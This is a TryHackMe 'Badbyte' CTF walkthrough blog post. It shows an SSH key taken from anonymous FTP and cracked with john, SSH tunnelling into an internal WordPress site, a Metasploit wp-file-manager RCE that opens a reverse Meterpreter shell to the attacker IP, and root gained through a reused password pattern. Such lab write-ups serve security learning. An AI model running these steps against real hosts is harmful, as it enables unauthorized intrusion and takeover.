---
title: "Badbyte"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="badbyte.png" width=200 alt="badbyte">

Look at this cool logo

## Enumeration

### nmap
```
ORT      STATE  SERVICE REASON       VERSION
11/tcp    closed systat  conn-refused

22/tcp    open   ssh     syn-ack      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9/A7kkuN5E+SS1C6w1NfeY196Rj4Y1Yx7njNCwNaCgIv8m+V+7MTHsRn3txLXRTHXErMqW3ypCmmjuY3O40kAragZSgA/XhdesGxGVa0szHK7H4fB28uQiyZgkOfIt/12kGaHB3iGwOeex2Hdg6ct4FdxTWKgDvuKZSLVoPXG66R8SOHql2cXfUtzyUMNJTTqoUED69soEJVG2ctfPKXi4BfFqM3OK2HgKzbmcSPXlLUTNhlcvjPuTa0kMRqiNTMVdP0PjSFdoaMviXHiznW7Fn6NHe3R/vIQt8Ac05Mdvim21QjRpJ4pm7v5+q1wXCJxGG6Ov71yThKP6yZ4ByMl
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9QUKykbzCSI7+PgoVzHNKOVIWf+zm0LN/f4n0VJc/P0J9TzLImkYHIOCnRFpNUPtiWGXbHXi67FQxEpgZMReo=
|   256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrvf1zJBhqU1RxUCYuTgoIy+7NzCqZeFWV67bt8+APV

80/tcp    closed http    conn-refused

30024/tcp open   ftp     syn-ack      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

```
classic go grab those ftp files (`note.txt` and `id_rsa`)

```
I always forget my password. Just let me store an ssh key here.
- errorcauser
```
what a guy...what a name...

```
└──╼ $python2 /usr/share/john/ssh2john.py id_rsa > id_john

└──╼ $john -w=/usr/share/wordlists/rockyou.txt id_john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa)
1g 0:00:00:18 DONE (2021-12-14 19:51) 0.05359g/s 768579p/s 768579c/s 768579C/sa6_123..*7¡Vamos!
Session completed
```
what a passphrase...

```
└──╼ $chmod 600 id_rsa

└──╼ $ssh errorcauser@10.10.218.175 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 14 18:57:42 UTC 2021

  System load:  0.08               Processes:           97
  Usage of /:   23.2% of 18.57GB   Users logged in:     0
  Memory usage: 65%                IP address for eth0: 10.10.218.175
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash-4.4$ 
```

Access granted

## port forwarding
```
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)

```
haha 'hi error...'

Modify your `/etc/proxychains.conf` then

```
└──╼ $ssh errorcauser@10.10.218.175 -i id_rsa -D 1337

└──╼ $proxychains nmap -sT 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 20:15 WAT
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:80-<><>-OK
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:995-<--timeout
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:25-<--timeout
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:8080-<--timeout
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:3306-<><>-OK
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:111-<--timeout
...

PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql

```

Now the actual port forward to access the website

```
└──╼ $sudo ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@10.10.68.101
...
```
And visit `http://127.0.0.1:80` to see badbyte being proudly powered by `wordpress`

ok for the enumeration we use nmap scripts, after we grab the wordpress version from the meta tags or with wpscan...

```
<meta name="generator" content="WordPress 5.7" />
```

```
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://127.0.0.1/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://127.0.0.1/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://127.0.0.1/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://127.0.0.1/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://127.0.0.1/, Match: 'WordPress 5.7'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.
```

```
└──╼ $ nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1
...

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

```

Google 'duplicator directory traversal' and get `CVE-2020-11738`

Google 'wp-file-manager rce' and get `CVE-2020-25213`

```
msf6 > search wp-file-manager

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution

...

msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST 10.8.226.203
LHOST => 10.8.226.203
msf6 exploit(multi/http/wp_file_manager_rce) > run

[-] Handler failed to bind to 10.8.226.203:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/jSj1S1.php
[*] Sending stage (39282 bytes) to 10.0.2.2
[+] Deleted jSj1S1.php
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.2:52588) at 2021-12-14 20:47:23 +0100

meterpreter > getuid
Server username: cth

meterpreter > shell
python3 -c "import pty;pty.spawn('/bin/bash')"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

cth@badbyte:/home/cth$ 

```
Get the user flag and get more powerful

## privilege escalation

They say cth got an old password somewhere...if it belongs to him we can `find` it

```
cth@badbyte:/home/cth$ find / -type f -user cth 2>/dev/null
...
/usr/share/wordpress/index.php
/usr/share/wordpress/wp-mail.php
/var/log/bash.log
```

its usually the last files that are worth it so ignore the flood

`bash.log` is something you might want to read

```
Try: sudo apt install <deb name>

cth@badbyte:~$ G00dP@$sw0rd2020
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
cth@badbyte:~$ ls
cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
 ____________________________
< vim >>>>>>>>>>>>>>>>> nano >
 ----------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

ok this part almost got me...he said it was an `old password` so it won't work

by the standards of 2020 its a good password...so maybe this fool changes his passwword every year?

AND HE DOES! 

WHO EVEN GOT TIME FOR THAT?

Anyway, back to business
```
cth@badbyte:/home/cth$ sudo -l
sudo -l
[sudo] password for cth: G00dP@$sw0rd2021

Matching Defaults entries for cth on badbyte:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL
```

lol that dude got mad sudo privileges 

just `su` to root

```
cth@badbyte:/home/cth$ sudo su
sudo su
root@badbyte:/home/cth# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Get the flag...

```
root@badbyte:~# cat root.txt
cat root.txt
  |      ______    ________   ________              ______        _____________ __________  |
  |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
  |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
  |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
  |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
  | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
  |                                  _________           __/   / /        \____________\/   |
  |                                 /________/\         /_____/ /                           |
  |                                 \________\/         \_____\/                            |

THM{bad_byte_root_flag_here}

 ________________________
< Made with ❤ by BadByte >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

I like how this room went through many things in a single ctf

the dynamic port forwarding part is just great






